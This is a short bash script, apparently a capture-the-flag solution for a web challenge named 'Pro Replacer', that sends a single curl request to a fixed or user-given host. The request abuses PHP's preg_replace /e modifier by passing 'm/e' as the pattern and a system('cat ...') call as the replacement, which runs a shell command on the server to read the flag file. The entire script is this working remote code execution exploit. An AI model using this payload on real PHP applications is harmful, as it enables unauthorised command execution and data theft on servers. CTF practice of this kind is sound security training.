#!/bin/bash

PORT=8001

if [[ $1 == "local" ]]
then
    URL='http://127.0.0.1:'$PORT
elif [[ $1 == "remote" ]] && [[ -z $2 ]]
then
    URL='http://141.85.224.101:'$PORT
else
    URL='http://'$1':'$2
fi

# Pro Replacer
echo "Start exploit for Pro Replacer"
echo "Flag is"

curl $URL'/?needle=m%2Fe&replacement=system%28%27cat+wRtu3ND38n8RNgez%27%29&haystack=m&submit=Replace' -s | grep SSS
